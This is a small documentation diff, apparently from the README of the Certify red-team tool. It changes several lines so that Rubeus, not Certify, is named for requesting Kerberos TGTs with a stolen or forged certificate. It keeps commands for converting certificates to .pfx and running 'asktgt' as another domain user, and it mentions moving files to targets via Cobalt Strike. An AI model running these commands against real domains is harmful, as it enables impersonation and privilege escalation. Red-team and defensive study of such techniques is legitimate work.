@@ -103,9 +103,9 @@ Certificates can be transformed to .pfx's usable with Certify with:
 
     openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 
-Certificates can be used with Certify to request a TGT with:
+Certificates can be used with Rubeus to request a TGT with:
 
-    Certify.exe asktgt /user:X /certificate:C:\Temp\cert.pfx /password:<CERT_PASSWORD>
+    Rubeus.exe asktgt /user:X /certificate:C:\Temp\cert.pfx /password:<CERT_PASSWORD>
 
 
 ## Example Walkthrough
@@ -288,9 +288,9 @@ Copy the ` -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----` sectio
     (base) laptop:~ harmj0y$
 
 
-Finally, move the cert.pfx to your target machine filesystem (manually or through Cobalt Strike), and request a TGT for the `altname` user using Certify:
+Finally, move the cert.pfx to your target machine filesystem (manually or through Cobalt Strike), and request a TGT for the `altname` user using Rubeus:
 
-    C:\Temp>Certify.exe asktgt /user:localadmin /certificate:C:\Temp\cert.pfx
+    C:\Temp>Rubeus.exe asktgt /user:localadmin /certificate:C:\Temp\cert.pfx
 
        ______        _
       (_____ \      | |
